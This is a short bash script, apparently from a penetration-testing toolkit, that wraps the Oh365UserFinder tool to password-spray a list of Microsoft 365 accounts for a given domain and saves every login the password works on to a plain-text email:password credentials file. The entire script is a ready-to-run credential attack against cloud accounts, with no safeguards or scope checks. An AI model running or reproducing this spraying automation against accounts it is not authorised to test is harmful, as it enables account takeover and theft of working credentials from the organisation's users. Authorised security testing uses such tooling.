#!/bin/bash

# Script to check provided password for a list of users from ./6/<domain>_users.txt

# Check if password and domain are provided
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <password> <domain>"
  exit 1
fi

PASSWORD=$1
DOMAIN=$2
USERLIST="./6/${DOMAIN}_users.txt"
RESULTS="./7/${DOMAIN}_results.txt"
CREDENTIALS="./7/${DOMAIN}_credentials.txt"

# Check if the user list file exists
if [ ! -f "$USERLIST" ]; then
  echo "Error: User list file '$USERLIST' not found."
  exit 1
fi

# Create the ./7 directory if it doesn't exist
mkdir -p ./7

# Run the oh365userfinder tool with the provided password and user list
python3 /opt/pentestcloud/Oh365UserFinder/oh365userfinder.py -p "$PASSWORD" --pwspray --elist "$USERLIST" > "$RESULTS"

# Check if the results file exists
if [ ! -f "$RESULTS" ]; then
  echo "Error: Results file '$RESULTS' not found."
  exit 1
fi

# Process the results and save valid emails and passwords
grep "Result" "$RESULTS" | while read -r line; do
  # Extract the email (from the format: [+] $user@domain)
  EMAIL=$(echo "$line" | grep -oP '\[\+\] \K[^ ]+')

  # If an email was found, save it with the password and display a success message
  if [ -n "$EMAIL" ]; then
    echo "$EMAIL:$PASSWORD" >> "$CREDENTIALS"
    echo "Password for user $EMAIL is correct."
  fi
done

echo "Credentials have been saved to '$CREDENTIALS'"
